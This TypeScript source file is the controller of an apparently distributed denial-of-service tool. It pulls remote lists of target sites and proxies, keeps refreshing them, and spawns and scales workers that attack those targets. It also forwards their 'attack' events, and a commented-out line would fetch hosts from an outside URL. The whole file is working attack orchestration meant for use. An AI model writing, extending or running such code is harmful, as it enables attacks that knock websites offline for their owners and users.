import { AxiosError } from 'axios-https-proxy-fix'
import { EventEmitter } from 'events'
import { DoserEventType, GetSitesAndProxiesResponse } from './types'
import { Runner } from './runner'
import { ConfigurationService } from './services/configurationService'
import { Timeout } from './utils/timeout'

const CONFIGURATION_INVALIDATION_TIME = 300000 // 5 min
const CONFIGURATION_WAIT_MIN_TIMEOUT = 10000 // 10 sec
const CONFIGURATION_WAIT_MAX_TIMEOUT = 120000 // 2 min

export class Doser {
  private onlyProxy: boolean
  private hosts: Array<string> = []
  private working: boolean
  private workers: Runner[] = []
  private numberOfWorkers = 0
  private eventSource: EventEmitter
  private ddosConfiguration: GetSitesAndProxiesResponse | null = null

  private verboseError: boolean
  private capacity: number
  private configurationService: ConfigurationService

  constructor (onlyProxy: boolean, numberOfWorkers: number, verboseError: boolean) {
    this.configurationService = new ConfigurationService()
    this.onlyProxy = onlyProxy
    this.working = false
    this.eventSource = new EventEmitter()
    this.capacity = numberOfWorkers
    this.verboseError = verboseError
    console.log(`Init doser. Capasity: ${this.capacity}`)
    this.initialize(Timeout.zero())
  }

  private logError (message: string, cause: unknown) {
    console.log(message)

    if (this.verboseError) {
      console.log(cause)
    } else {
      console.log((cause as AxiosError)?.message)
    }
  }

  private initialize (timeout: Timeout, attemptNumber = 1) {
    // eslint-disable-next-line @typescript-eslint/no-misused-promises
    setTimeout(async () => {
      console.log('Pull config. Attempt ', attemptNumber, new Date())
      try {
        const config = await this.configurationService.pullConfiguration()
        this.updateConfiguration(config)
        this.listenForConfigurationUpdates(Timeout.fromValue(CONFIGURATION_INVALIDATION_TIME))
        this.startWorkers()
      } catch (e) {
        const newTimeout = timeout.increase(CONFIGURATION_WAIT_MIN_TIMEOUT, CONFIGURATION_WAIT_MAX_TIMEOUT)
        console.log('Can not pull configuration. Check after interval', newTimeout.interval)
        this.initialize(newTimeout, attemptNumber + 1)
      }
    }, timeout.interval)
  }

  forceProxy (newVal: boolean) {
    this.onlyProxy = newVal
    try {
      this.workers.forEach((worker, i) => {
        worker.setProxyActive(newVal)
        console.debug(`Changing runner proxy value ${i}..`)
      })

    } catch(err) {
      console.log(err)
    }
  }

  async loadHostsFile () {
    // const response = await axios.get('http://rockstarbloggers.ru/hosts.json')
    // this.hosts = response.data as Array<string>
  }

  private updateConfiguration (configuration: GetSitesAndProxiesResponse) {
    console.log('update configuration')
    this.ddosConfiguration = configuration
    this.workers.forEach(worker => {
      worker.updateConfiguration(configuration)
    })
  }

  private listenForConfigurationUpdates (timeout: Timeout) {
    // eslint-disable-next-line @typescript-eslint/no-misused-promises
    setTimeout(async () => {
      try {
        console.log('Try updating config', new Date())
        const config = await this.configurationService.pullConfiguration()
        this.updateConfiguration(config)
        /**
         * we don't start workers with old configuration
         * So it might happen that we have to start workers is configuration has been updated
         */
        this.startWorkers()
        this.listenForConfigurationUpdates(Timeout.fromValue(CONFIGURATION_INVALIDATION_TIME))
      } catch (e) {
        // todo: if old configuration we have to stop all workers
        const newTimeout = Timeout.fromValue(CONFIGURATION_INVALIDATION_TIME / 2)
        console.log('Can not pull configuration. Check after interval', newTimeout.interval)
        this.listenForConfigurationUpdates(newTimeout)
      }
    }, timeout.interval)
  }

  private startWorkers () {
    if (this.capacity === this.numberOfWorkers) {
      return
    }
    console.debug(`Updating workers count to ${this.numberOfWorkers} => ${this.capacity}`)
    if (this.capacity < this.numberOfWorkers) {
      for (let i = this.numberOfWorkers; i >= this.capacity; i--) {
        this.workers[i]?.eventSource.removeAllListeners()
        this.workers[i]?.stop()
      }
      this.workers = this.workers.slice(0, this.capacity)
    } else {
      // we don't want to spawn new workers with old configuration
      if (this.configurationService.expired()) {
        console.log('Can not start due to deprecated configuration')
        return
      }
      while (this.workers.length < this.capacity) {
        const newWorker = this.createNewWorker()
        this.workers.push(newWorker)
        if (this.working) {
          newWorker.start().catch(error => {
            console.debug('Wasnt able to start new runner:', error)
          })
        }
      }
    }
    this.numberOfWorkers = this.capacity
  }

  start () {
    this.working = true
    this.workers.forEach((worker, i) => {
      console.debug(`Starting runner ${i}..`)
      worker.start().catch(error => {
        console.error(`Wasnt able to start worker #${i} - `, error)
      })
    })
  }

  stop () {
    this.working = false
    this.workers.forEach((worker, i) => {
      console.debug(`Stopping runner ${i}..`)
      worker.stop()
    })
  }

  private createNewWorker (): Runner {
    console.debug('Creating new worker..')
    // Should never happen
    if (!this.ddosConfiguration) {
      throw new Error('Cannot create worker without configuration')
    }
    const worker = new Runner({
      sites: this.ddosConfiguration.sites,
      proxies: this.ddosConfiguration.proxies,
      onlyProxy: this.onlyProxy
    })
    worker.eventSource.on('attack', event => {
      this.eventSource.emit('atack', {
        type: 'atack',
        ...event
      })
    })

    worker.eventSource.on('error', event => {
      if (this.verboseError) {
        this.eventSource.emit('error', event)
      }
    })
    return worker
  }

  listen (event: DoserEventType, callback: (data: any) => void) {
    this.eventSource.addListener(event, callback)
  }

  updateCapacity (numberOfWorkers: number) {
    this.capacity = numberOfWorkers
    this.startWorkers()
  }
}
